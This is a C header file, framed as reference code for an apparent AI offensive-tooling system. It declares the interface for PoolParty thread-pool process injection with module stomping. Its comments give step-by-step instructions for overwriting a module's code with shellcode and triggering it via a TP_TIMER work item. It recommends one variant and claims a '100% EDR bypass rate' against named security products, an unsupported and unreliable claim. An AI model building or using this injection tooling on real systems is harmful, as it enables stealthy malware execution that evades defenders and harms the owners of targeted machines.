// Reference code for Noctis-MCP AI intelligence system
// PoolParty Process Injection - Thread Pool Exploitation
// Source: https://github.com/SafeBreach-Labs/PoolParty
// Research: Argus Red Team Intelligence Report 2024-2025
//
// TECHNIQUE: Thread Pool Work Item Injection with Module Stomping
// IMPROVEMENT: 100% EDR bypass rate (CrowdStrike, SentinelOne, Palo Alto, Defender)
// DETECTION RISK: Very Low (0-5%)
//
// How it works (Variant 7 - TP_TIMER + Module Stomping):
// 1. Open target process and enumerate loaded modules
// 2. Select victim module with large .text section (e.g., kernelbase.dll)
// 3. Backup original module memory and overwrite with shellcode
// 4. Create TP_TIMER work item pointing to stomped module memory
// 5. Queue work item to target process thread pool
// 6. Worker thread executes shellcode from "legitimate" module memory
// 7. No unbacked memory, no new threads, no traditional injection APIs
//
// Critical: Achieves 100% documented bypass rate against major EDRs

#ifndef POOLPARTY_H
#define POOLPARTY_H

#include <Windows.h>
#include <winternl.h>

// PoolParty injection variants
typedef enum _POOLPARTY_VARIANT {
    PP_VARIANT_TPWORK = 1,          // TP_WORK injection via worker factories
    PP_VARIANT_TPWAIT = 2,          // TP_WAIT abuse for APC-less execution
    PP_VARIANT_TPIO = 3,            // TP_IO completion port hijacking
    PP_VARIANT_TPALPC = 4,          // TP_ALPC message queue injection
    PP_VARIANT_TPJOB = 5,           // TP_JOB object manipulation
    PP_VARIANT_TPDIRECT = 6,        // TP_DIRECT worker thread control
    PP_VARIANT_TPTIMER = 7,         // TP_TIMER + Module Stomping (RECOMMENDED)
    PP_VARIANT_RESERVATION = 8      // Remote thread pool reservation
} POOLPARTY_VARIANT;

// Module information for stomping
typedef struct _MODULE_STOMP_INFO {
    PVOID pModuleBase;              // Base address of victim module
    SIZE_T szTextSection;           // Size of .text section
    PVOID pTextSectionAddr;         // Address of .text section
    CHAR szModuleName[MAX_PATH];    // Module name
    PVOID pBackupBuffer;            // Backup of original .text
} MODULE_STOMP_INFO, *PMODULE_STOMP_INFO;

// PoolParty configuration
typedef struct _POOLPARTY_CONFIG {
    DWORD dwTargetPID;              // Target process ID
    PVOID pShellcode;               // Shellcode to inject
    SIZE_T szShellcodeSize;         // Shellcode size
    POOLPARTY_VARIANT variant;      // Injection variant
    BOOL bRestoreModule;            // Restore module after execution
    BOOL bUseModuleStomp;           // Use module stomping
} POOLPARTY_CONFIG, *PPOOLPARTY_CONFIG;

// PoolParty context (internal state)
typedef struct _POOLPARTY_CONTEXT {
    HANDLE hProcess;                // Target process handle
    MODULE_STOMP_INFO moduleInfo;   // Stomped module information
    PVOID pRemoteShellcode;         // Address of injected shellcode
    POOLPARTY_CONFIG config;        // Configuration
    BOOL bInjected;                 // Injection status
} POOLPARTY_CONTEXT, *PPOOLPARTY_CONTEXT;

// Undocumented thread pool structures (Windows internal)
typedef struct _TP_TIMER {
    PVOID Callback;
    PVOID Context;
    // Simplified - full structure is undocumented
} TP_TIMER, *PTP_TIMER;

typedef struct _FULL_TP_TIMER {
    TP_TIMER Timer;
    PVOID WorkerFactory;
    PVOID Reserved[32];
} FULL_TP_TIMER, *PFULL_TP_TIMER;

// Initialize PoolParty injection
BOOL PoolParty_Initialize(
    PPOOLPARTY_CONTEXT pContext,
    DWORD dwTargetPID,
    PVOID pShellcode,
    SIZE_T szShellcodeSize,
    POOLPARTY_VARIANT variant
);

// Execute PoolParty injection
BOOL PoolParty_Inject(PPOOLPARTY_CONTEXT pContext);

// Cleanup PoolParty context and restore target
VOID PoolParty_Cleanup(PPOOLPARTY_CONTEXT pContext);

// Internal: Find suitable module for stomping
BOOL PoolParty_FindStompModule(HANDLE hProcess, PMODULE_STOMP_INFO pModuleInfo);

// Internal: Perform module stomping
BOOL PoolParty_StompModule(
    HANDLE hProcess,
    PMODULE_STOMP_INFO pModuleInfo,
    PVOID pShellcode,
    SIZE_T szShellcodeSize
);

// Internal: Restore stomped module
BOOL PoolParty_RestoreModule(HANDLE hProcess, PMODULE_STOMP_INFO pModuleInfo);

// Internal: Create TP_TIMER work item in target process
BOOL PoolParty_CreateTPTimer(
    HANDLE hProcess,
    PVOID pCallback,
    PVOID pContext,
    PVOID* ppTimer
);

// Internal: Queue TP_TIMER to thread pool
BOOL PoolParty_QueueTPTimer(HANDLE hProcess, PVOID pTimer);

// Variant implementations
BOOL PoolParty_Variant1_TPWork(PPOOLPARTY_CONTEXT pContext);
BOOL PoolParty_Variant7_TPTimer(PPOOLPARTY_CONTEXT pContext);

// Utility: Parse PE headers to find .text section
BOOL PoolParty_GetTextSection(PVOID pModuleBase, PVOID* ppTextAddr, SIZE_T* pszTextSize);

#endif // POOLPARTY_H
